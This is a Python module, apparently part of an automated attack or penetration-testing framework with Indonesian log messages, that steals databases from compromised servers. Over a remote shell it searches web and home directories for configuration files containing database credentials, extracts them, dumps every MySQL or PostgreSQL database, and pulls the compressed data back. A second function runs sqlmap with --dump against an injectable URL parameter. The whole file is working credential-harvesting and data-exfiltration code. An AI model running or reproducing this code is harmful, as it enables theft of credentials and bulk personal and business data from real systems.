from __future__ import annotations
import base64, gzip, re
from ..modules.base import Finding

CRED = re.compile(r"(DB_(?:HOST|USER|NAME|PASSWORD|DATABASE)|mysql|postgres|mongodb)[^\n]{0,120}", re.I)


async def via_shell(ctx, sh) -> Finding | None:
    r = await sh.exec(
        "grep -rIl -E 'DB_PASSWORD|DB_USER|mysql:host|postgres://' /var/www /srv /opt /home "
        "--include='*.env' --include='*.php' --include='*.yml' --include='*.py' "
        "--include='*.json' 2>/dev/null | head -20", timeout=60)
    files = [l.strip() for l in r.out.splitlines() if l.strip()]
    if not files:
        await ctx.log("[db] tidak ada konfigurasi DB ditemukan")
        return None

    creds = []
    for f in files[:10]:
        c = await sh.exec(f"cat {f} 2>/dev/null | head -60")
        for m in CRED.finditer(c.out):
            creds.append(m.group(0))
    ctx.save("db-creds.txt", "\n".join(creds))
    if not creds:
        return None

    out_dir = ctx.ev_dir() / "dbdump"
    out_dir.mkdir(exist_ok=True)
    dumped = []

    for host, user, pwd, db in _parse(creds):
        for cmd, engine in (
            (f"mysqldump -h{host} -u{user} -p{pwd} --all-databases --single-transaction 2>/dev/null "
             f"| gzip | base64 -w0", "mysql"),
            (f"PGPASSWORD={pwd} pg_dump -h{host} -U{user} -d {db} 2>/dev/null | gzip | base64 -w0", "postgres"),
        ):
            await ctx.log(f"[db] coba {engine} {host}")
            r = await sh.exec(cmd, timeout=600)
            if not r.out or len(r.out) < 200:
                continue
            raw = base64.b64decode(r.out.strip() + "==")
            p = out_dir / f"{engine}-{host}.sql.gz"
            p.write_bytes(raw)
            dumped.append(p.name)
            break

    if not dumped:
        return None
    return await ctx.emit(Finding(
        kind="db-dump", title=f"{len(dumped)} database berhasil di-dump",
        target=ctx.target, severity="critical", confidence="confirmed",
        evidence=f"kredensial: {len(creds)} baris\nfile: {', '.join(dumped)}",
        repro=[f"zcat evidence/dbdump/{d} | head" for d in dumped],
        poc=f"mysqldump -h{host} -u{user} -p'{pwd}' --all-databases | gzip > dump.sql.gz",
        data={"files": dumped}))


def _parse(creds):
    host = user = pwd = db = "localhost"
    for line in creds:
        for k, v in (("host", r"(?:HOST|host)[\"'\s:=]+([\w.\-]+)"),
                     ("user", r"(?:USER|user)[\"'\s:=]+([\w.\-]+)"),
                     ("pwd", r"(?:PASSWORD|password|pass)[\"'\s:=]+([^\s\"';]+)"),
                     ("db", r"(?:DATABASE|database|dbname)[\"'\s:=]+([\w.\-]+)")):
            m = re.search(v, line)
            if m:
                if k == "host": host = m.group(1)
                if k == "user": user = m.group(1)
                if k == "pwd": pwd = m.group(1)
                if k == "db": db = m.group(1)
    yield host, user, pwd, db


async def via_sqli(ctx, f) -> Finding | None:
    from ..modules.base import Module
    out_dir = ctx.ev_dir() / "sqldump"
    out_dir.mkdir(exist_ok=True)
    rc, out, err = await _tool(ctx, ["sqlmap", "-u", f.data["url"], "-p", f.data["param"],
                                     "--batch", "--dump", "--threads", "6",
                                     "--timeout", "30", "--disable-coloring"])
    (out_dir / "sqlmap.log").write_text(out + err, errors="ignore")
    if "retrieved" not in (out + err).lower() and "dumped" not in (out + err).lower():
        return None
    return await ctx.emit(Finding(
        kind="db-dump", title="Database di-dump via SQLi", target=f.target,
        severity="critical", confidence="confirmed",
        evidence="lihat evidence/sqldump/sqlmap.log",
        repro=[f"sqlmap -u '{f.data['url']}' -p {f.data['param']} --batch --dump"],
        data={"dir": "evidence/sqldump"}))


async def _tool(ctx, argv):
    import asyncio, shutil
    if shutil.which(argv[0]) is None:
        return 127, "", ""
    p = await asyncio.create_subprocess_exec(
        *argv, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    o, e = await asyncio.wait_for(p.communicate(), timeout=2400)
    return p.returncode or 0, o.decode("utf8", "ignore"), e.decode("utf8", "ignore")
